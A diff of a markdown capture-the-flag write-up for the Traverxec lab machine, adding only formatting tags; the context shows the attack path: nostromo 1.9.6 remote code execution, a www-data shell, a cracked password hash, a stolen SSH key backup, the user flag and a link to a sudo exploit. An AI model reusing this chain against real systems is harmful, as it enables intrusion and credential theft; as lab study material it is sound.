@@ -11,6 +11,7 @@ image:
 ```bash
 IP : 10.10.10.165
 ```
+{: .nolineno}
 
 ## Port Scan Results ➡️
 
@@ -31,6 +32,7 @@ PORT   STATE SERVICE VERSION
 80/tcp open  http    nostromo 1.9.6
 Service Info: ; CPE: cpe:/o:linux:linux_kernel
 ```
+{: .nolineno}
 
 ## Web Enumeration ⤵️
 
@@ -48,6 +50,7 @@ nostromo 1.9.6 - Remote Code Execution          | multiple/remote/47837.py]
 ------------------------------------------------ ---------------------------------
 Shellcodes: No Results
 ```
+{: .nolineno}
 
 Lets try it out now →
 
@@ -72,6 +75,7 @@ Connection: close
 
 www-data
 ```
+{: .nolineno}
 
 Now lets try reverse shell command execution from it →
 
@@ -92,6 +96,7 @@ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 www-data@traverxec:/usr/bin$
 ```
+{: .nolineno}
 
 Found something interesting →
 
@@ -100,6 +105,7 @@ www-data@traverxec:/var/nostromo/conf$ cat .htpasswd
 david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
 www-data@traverxec:/var/nostromo/conf$
 ```
+{: .nolineno}
 
 Now with the help of hashcat I decoded the password of david →
 
@@ -108,12 +114,14 @@ hashes.txt = $1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
 
 commands : hashcat -m 500 hashes.txt /usr/share/wordlists/rockyou.txt
 ```
+{: .nolineno}
 
 ![Untitled](/Vulnhub-Files/img/Traverxec/Untitled%202.png)
 
 ```bash
 $1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:Nowonly4me
 ```
+{: .nolineno}
 
 But each time I use this password it says invalid →
 
@@ -123,6 +131,7 @@ Password:
 su: Authentication failure
 www-data@traverxec:/home$
 ```
+{: .nolineno}
 
 Lets find something else →
 
@@ -147,6 +156,7 @@ drwxr-xr-x 3 david david 4096 Oct 25  2019 ..
 -rw-r--r-- 1 david david 1915 Oct 25  2019 backup-ssh-identity-files.tgz
 www-data@traverxec:/home/david$
 ```
+{: .nolineno}
 
 Now lets see inside the `backup-ssh-identity-files.tgz` file →
 
@@ -159,12 +169,14 @@ drwx------ david/david       0 2019-10-25 17:02 home/david/.ssh/
 -rw-r--r-- david/david     397 2019-10-25 17:02 home/david/.ssh/id_rsa.pub
 www-data@traverxec:/home/david$
 ```
+{: .nolineno}
 
 Now if I can extract data so extract at /tmp/Data location so for that I used this command →
 
 ```bash
 tar zxvf /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz -C /tmp/Data
 ```
+{: .nolineno}
 
 ```bash
 www-data@traverxec:/tmp/Data$ find .
@@ -177,6 +189,7 @@ www-data@traverxec:/tmp/Data$ find .
 ./home/david/.ssh/id_rsa.pub
 www-data@traverxec:/tmp/Data$
 ```
+{: .nolineno}
 
 Lets see the `id_rsa` file here →
 
@@ -214,6 +227,7 @@ VeYniFU/TGnRKDYLQH2x0ni1tBf0wKOLERY0CbGDcquzRoWjAmTN/PV2VbEKKD/w]
 -----END RSA PRIVATE KEY-----
 www-data@traverxec:/tmp/Data/home/david/.ssh$
 ```
+{: .nolineno}
 
 Lets see the paraphrase of `id_rsa` from cracking it through `john the ripper` →
 
@@ -242,6 +256,7 @@ david@traverxec:~$ cat user.txt
 44321fe1b9364d36aee2333a9ccb0715
 david@traverxec:~$
 ```
+{: .nolineno}
 
 Now I find the version of sudo outdated so I tried this exploit directly and I got what I wanted →
 [exploit_nss.py File](https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py)
@@ -254,6 +269,7 @@ Sudoers file grammar version 46
 Sudoers I/O plugin version 1.8.27
 www-data@traverxec:/$
 ```
+{: .nolineno}
 
 ```bash
 david@traverxec:/tmp$ python exploit.py
